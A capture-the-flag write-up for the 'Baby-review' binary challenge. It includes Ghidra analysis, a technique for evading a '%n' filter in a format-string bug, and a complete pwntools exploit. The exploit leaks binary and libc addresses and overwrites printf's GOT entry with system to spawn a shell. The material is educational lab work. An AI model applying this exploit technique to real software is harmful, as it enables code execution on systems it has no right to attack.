# Challenge Info:

* **Challenge Name:** Baby-review

* **Challenge Category:** Binary

* **Challenge Author:** Laozi

* **Challenge Description:** I've created a fun program for you to review your favorite movies and books. Can you figure out the problem with it?

* **Files Provided:** baby-review, libc.so.6

# Recon:

To start off we are given a binary with its libc file, so I ran file and checksec on the binary to learn more about it.

![image](https://user-images.githubusercontent.com/91157382/232237684-54a9be71-64f0-4887-a759-96f88b4949a7.png)

![image](https://user-images.githubusercontent.com/91157382/232237651-ca86a910-a78b-46ec-ba87-36592afc6189.png)

Opening the binary with Ghidra we can start looking through key functions for vulnerabilities and because the binary is not stripped it makes this part quite a bit nicer.

![image](https://user-images.githubusercontent.com/91157382/232238152-89bf9a87-5de0-4e4f-8cc4-222651235413.png)

The main function just seems to ask the user to provide the capital of a country the program provides from countries.txt. Nothing looks vulnerable here though with properly sized buffers and we can't control countries.txt, so this just seems like an additional step we have to do at the start of any of our solutions. Then, main calls menu which seems to be the more important function we should be concerned about.

![image](https://user-images.githubusercontent.com/91157382/232238330-2be1b809-e2e5-4383-a1c7-16f54529dc09.png)

So this just looks like a typical menu function with some options. The only interesting thing here is that the program only displays four options to the user, but we see there is a 5th option to add a movie, but we will get back to that later. Our 5 main functions from the menu are: read_book(), watch_movie(), review(), an exit option, and add_movie(). Let's look through these all individually.

![image](https://user-images.githubusercontent.com/91157382/232238464-0fc8d3df-0ef8-43cc-95cc-552b810aa713.png)

Our first option is quite underwhelming as it simply prints two strings that we can't control and returns.

![image](https://user-images.githubusercontent.com/91157382/232238546-fb78697d-7028-4e31-b7e5-462e8b3aab3c.png)

Ah now this functions looks much more vulnerable. Initially it prints some strings like the previous method, but then runs a seemingly unrestricted printf on a char array that is defined in menu with a size of 303. If any of the other functions gives us control of what goes into this variable, this would become a simple printf vulnerability challenge. But let's keep going.

![image](https://user-images.githubusercontent.com/91157382/232238684-47b7d9d9-afbb-498b-9601-6633451bd8a4.png)

This is another not very helpful function. It does read some input from the user, but this is protected from overflow and it is only stored in local variables, so we don't have much control over anything here.

![image](https://user-images.githubusercontent.com/91157382/232238786-b8b0588a-4ee7-4058-aaf2-e3e541cde0cf.png)

Our fourth option is quite interesting as it doesn't call another function and does everything inside of menu. This option promptly ends the program after returning, but it does take some user input before returning. The user is able to input 0x30 bytes into a buffer of that has a size of 32 bytes. This means we have 16 bytes of overflow. 

![image](https://user-images.githubusercontent.com/91157382/232238969-fe59fc5e-5a16-48e1-abfb-32247222d314.png)

After testing this with gdb I found that if I use up all 48 bytes of my input, the last 8 will end up in the RIP, so we can jump wherever we'd like. However, this isn't enough to create a ropchain and as we saw with earlier protections NX is enabled, so we can't jump into shellcode. I'll keep this in mind however and continue with our last function.

![image](https://user-images.githubusercontent.com/91157382/232239091-b0077334-83ec-4499-9e31-a4d0831ff4ca.png)

Ah here it is. We finally have a way to control what is being printf'ed in watch_movie(). We are able to input a whopping 300 characters which should be plenty for any of our payloads. However, there is one catch. Our payload is unable to have %n in it.

During the CTF I was stumped here as I thought without %n, my only options left were leaking addresses and the small exit overflow which wouldn't be enough to exploit anything critical. However, coming back after the CTF ended I learned about two methods to solve this:
1. Some people had the same thinking as I did that printf could only be used for leaking, but they were able to find creative ways to exploit the exit option such as this great writeup here which uses stack pivoting: https://rektedekte.github.io/CTF-writeups/DamCTF%202023/baby-review/.
2. However, another method I realized is that the check for '%n' does very little. There are two major ways I know to work around this. 
   * The first is actually quite simple, %n works just like other format strings in the sense that it can be modified for more accuracy. For example, if you want to access the 29th pointer in memory, you don't need a payload of 29 %p's, instead you can just use %29$p. %n works in a similar way that you can break it up to be %29$n, this isn't a realistic example, but hopefully you get the idea.
   * The second workaround is something called "length modifiers". The %n option can be modified to be %hn and %hhn in order to only write a specified amount of bytes at the target address. This is better explained in this article: https://medium.com/swlh/binary-exploitation-format-string-vulnerabilities-70edd501c5be, but essentially we can opt for using more %hn's which will bypass the check and only lengthen our payload, but we have a space of 300 characters to work with so length isn't an issue at all.

Knowing this I opted to try and solve this using the common method of overwriting the GOT to pop a shell. Using this method everything is possible simply by using the two methods: watch_movie() and add_movie() to write to the buffer and then printf it for both leaks and overwriting addresses.

# Solution:

To start we need two leaks. One to get the base address of the binary and one for the base address of the libc. We need these two because getting the base of the binary helps us find the address of all GOT functions allowing us to overwrite any we want. Then the base of libc allows us to find the address of system which will allow us to call system('/bin/sh') and pop a shell.

To find good addresses for leaking is just a lot of trial and error. I also temporarily disabled ASLR when doing this to make the process a little easier. I used a leak.py script that printed the first 50 pointers in memory. I got a list of 50 and cleaned it up to remove any that were nil or just not accessible addresses. My cleaned up list was:
```
Offset 3: 0x7ffff7e9da37
Offset 4: 0x7ffff7fa4a70
Offset 5: 0x7ffff7fa4a70
Offset 7: 0x7fffffffdb90
Offset 8: 0x7fffffffdce0
Offset 9: 0x555555555580
Offset 27: 0x7ffff7e13f6d
Offset 29: 0x7ffff7fa3780
Offset 31: 0x55555555a690
Offset 33: 0x7ffff7e15a61
Offset 36: 0x7ffff7fa3780
Offset 37: 0x555555556375
Offset 38: 0x7ffff7fa3868
Offset 39: 0x7ffff7f9f600
Offset 40: 0x7ffff7ffd040
Offset 41: 0x7ffff7e15f43
Offset 43: 0x7ffff7fa3780
Offset 44: 0x555555556375
Offset 45: 0x7ffff7e0a02a
Offset 49: 0x7fffffffdd40
```
The addresses starting with 0x7f were usually in the libc while addresses starting with 0x55 were in the binary. For each of these addresses I would simply run `x/s address` to see what was at that address. Going through the libc ones first I eventually found offset 29 was quite convenient as it pointed exactly to the address of the function `_IO_2_1_stdout_`.

![image](https://user-images.githubusercontent.com/91157382/232246600-e570e50f-86ef-4d28-8a1f-751b6fa1763d.png)

This is convenient as in our pwntools script we will just be able to subtract the location of `_IO_2_1_stdout_` in our provided libc file from our leak and we will get the base of our libc.

Next for the base address of the binary I ended up using the very first possible address at offset 9 as it pointed to the address of menu+198, so this is again simple to find the base address of the binary again with pwntools. All we have to do is subtract the location of menu in our binary and subtract 198 to get the base of our binary.

![image](https://user-images.githubusercontent.com/91157382/232246879-7c094640-85c6-4a76-9b7b-24d4e7a48434.png)

Now I started to build the script and double-checked to make sure the addresses my script was generating would match up with the base addresses by attaching gdb and running `info proc map`. I also re-enabled ASLR to ensure it works dynamically too.
```python
from pwn import *

elf = ELF('./baby-review',checksec=False)
libc = ELF('libc.so.6',checksec=False)
p = process(elf.path)
gdb.attach(p)

p.recvline()
print(p.recvline().decode())
capital = "Paris"
p.sendline(capital.encode('utf-8'))

p.clean()
p.sendline(b'5')
p.recvline()
payload = b'%9$p %29$p'
p.sendline(payload)
p.clean()
p.sendline(b'2')
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()

leaks = p.recvline().decode().strip().split(' ')
binLeak = leaks[0]
binBase = int(binLeak,16) - elf.symbols['menu'] - 198
libcLeak = leaks[1]
libcBase = int(libcLeak,16) - libc.symbols['_IO_2_1_stdout_']

print("Binary Base: " + hex(binBase))
print("Libc Base: " + hex(libcBase))

p.interactive()
```

![image](https://user-images.githubusercontent.com/91157382/232248132-d6498cdc-b531-4063-908c-c247c8ed66d4.png)

Great, leaking addresses is working perfectly, now we can move onto the next step, overwriting the GOT.

Before overwriting anything we need to figure out which function in the GOT to overwrite. I know I want system() from the libc to be called, but what function would work best to replace with system. Because we are trying to pass the parameter /bin/sh we usually want to choose a function in the GOT that is run with only a single parameter and we have control over that parameter. In this case there is no simple gets or puts, but if you think about it there is a function that takes in our input as a parameter and we have already been using it. Printf!

That's right, printf is in the GOT, so if we overwrite it with system, we can simply call add_movie again, input /bin/sh as our text. Then once we call watch_movie, it won't print /bin/sh, but instead call system and pass it one parameter, which will be our input of /bin/sh.

The last part to figure out is how to use %n and its variations to overwrite the GOT entry for printf with system. Well pwntools has a neat function called fmtstr_payload. I was not aware of the function during the CTF, but now that I know about it, this is definitely a must have for any printf vulnerability challenge. In order to understand it and its parameters better I will show the pwntools documentation entry about it. If you'd like to read more about it or see some examples you can find them here: https://docs.pwntools.com/en/stable/fmtstr.html.

![image](https://user-images.githubusercontent.com/91157382/232249177-c497f13e-63e6-42c6-bfd9-05102220f1bd.png)

So this function takes three necessary parameters: offset and writes. We don't need to worry about numbwritten in our case as it is good with the default of 0 and write_size refers to the length modifiers I mentioned earlier, preferably we should keep this at byte or short to use %hhn and %hn respectively, but we can keep this parameter at the default write size of byte as it is ok if our payload is a little longer.
To figure out what our offset parameter should be, we need to input some characters and read memory in the same payload and find at what offset we first start to see our characters.

![image](https://user-images.githubusercontent.com/91157382/232249609-5502f641-206b-4872-a1d1-1f074dc0d463.png)

This is quite easy to do and requires no scripting you can just run the binary on its own. We see our A's or 0x41 in hex starts to appear at the 10th offset first. So offset will be 10 in our script.

The next parameter writes is simply a dictionary with the format {address: value} of what we want to overwrite. So, we want to overwrite the GOT entry for printf which can be easily found with pwntools like so: `elf.got['printf']` and we want to overwrite it with the address of system in our libc file which can be found like like this: `libc.symbols['system']`.

We now have everything we need and just have to put it all together in a script. To the end of the script to find leaks I added:
```python
elf.address = binBase
libc.address = libcBase

p.clean()
p.sendline(b'5')
p.clean()
writes = {
    elf.got['printf']: libc.symbols['system']
}
payload = fmtstr_payload(10, writes)
p.sendline(payload)

p.clean()
p.sendline(b'2')
p.clean()
p.sendline(b'5')
p.recvline()
p.sendline(b'/bin/sh')
p.clean()
p.sendline(b'2')
p.clean()
p.interactive()
```

Now when I run the script I should get a shell! But instead, I got an error :(

![image](https://user-images.githubusercontent.com/91157382/232249881-16702e65-bc81-4432-a4df-c01ffd49e9c9.png)

This error was quite annoying to debug, but I knew something was wrong with my call to fmtstr_payload so I looked back at the documentation and read the first sentence: "Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from `context.bits`". Looking through more pwntools documentation I found the default of context.bits is set to 32, but our binary is 64 bit which was causing the error.

![image](https://user-images.githubusercontent.com/91157382/232249985-2a252810-ccf4-479e-9d5a-27e2f3db2739.png)

This is easily fixed, at the top of my script instead of running:
```python
elf = ELF('./baby-review',checksec=False)
```
we can run:
```python
elf = context.binary = ELF('./baby-review',checksec=False)
```
Now context.binary will be set to our binary which will automatically update many values of context, including context.bits for us. Now that I figured out the error I ran it again and voila we get our flag!

![image](https://user-images.githubusercontent.com/91157382/232250085-1e477d91-a630-45df-b62e-684def691996.png)
